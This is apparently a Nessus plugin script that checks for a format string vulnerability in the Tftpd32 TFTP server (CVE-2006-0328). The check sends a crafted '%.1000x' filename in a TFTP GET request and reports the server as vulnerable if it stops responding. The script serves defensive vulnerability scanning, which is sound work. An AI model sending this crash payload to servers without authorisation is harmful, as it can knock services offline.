#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote tftp server is affected by a format string vulnerability. 

Description :

The remote host appears to be running Tftpd32, a tftpd server for
Windows. 

There is a format string vulnerability in versions of Tftpd32 up to
and including 2.81 that may allow remote attackers to crash the server
or to execute code on the affected host subject to the privileges
under which the server operates, possibly SYSTEM since the application
can be configured to run as a service. 

See also :

http://www.critical.lt/?vulnerabilities/200
http://www.securityfocus.com/archive/1/422405/30/0/threaded

Solution :

Unknown at this time.

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:N/A:P/B:N)";


if (description) {
  script_id(20755);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-0328");
  script_bugtraq_id(16333);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"22661");
  }

  script_name(english:"Tftpd32 Format String Vulnerability");
  script_summary(english:"Checks for a format string vulnerability in Tftpd32");

  script_description(english:desc);

  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("tftpd_detect.nasl");
  script_require_keys("Services/udp/tftp");

  exit(0);
}


include("misc_func.inc");
include("global_settings.inc");


if ( paranoia_level < 2 ) exit(0);
port = get_kb_item("Services/udp/tftp");
if (!port) port = 69;


function tftp_get(port, file) {
  local_var data, filter, i, ip, req, res, sport, tries, udp;

  if (isnull(port)) port = 69;
  if (isnull(file)) return NULL;

  req = raw_string(
    0x00, 0x01,                        # GET
    file, 0x00,                        # file
    "netascii", 0x00                   # as netascii
  );

  ip = forge_ip_packet(
    ip_hl:5, 
    ip_v:4, 
    ip_tos:0, 
    ip_len:20, 
    ip_id:rand(), 
    ip_off:0, 
    ip_ttl:64, 
    ip_p:IPPROTO_UDP,
    ip_src:this_host()
  );
  sport = rand() % 64512 + 1024;		     
  udp = forge_udp_packet(
    ip:ip, 
    uh_sport:sport, 
    uh_dport:port, 
    uh_ulen:8 + strlen(req), 
    data:req
  );

  filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';

  tries = 2;
  for (i=0; i < tries; i++) {
    res = send_packet(
      udp, 
      pcap_active:TRUE, 
      pcap_filter:filter, 
      pcap_timeout:1
    );
    if (res) break;
  }

  # If there's a result, return the data.
  if (res) {
    return get_udp_element(udp:res, element:"data");
  }
}


# If the server is up...
res = tftp_get(port:port, file:string("nessus", rand()));
if (!isnull(res)) {
  # Try to exploit it.
  res = tftp_get(port:port, file:"%.1000x");

  # If we didn't get anything back...
  if (isnull(res)) {
    # Test the server again.
    res = tftp_get(port:port, file:string("nessus", rand()));

    # There's a problem if we didn't get anything back.
    if (isnull(res)) security_note(port:port, protocol:"udp", data:desc);
  }
}
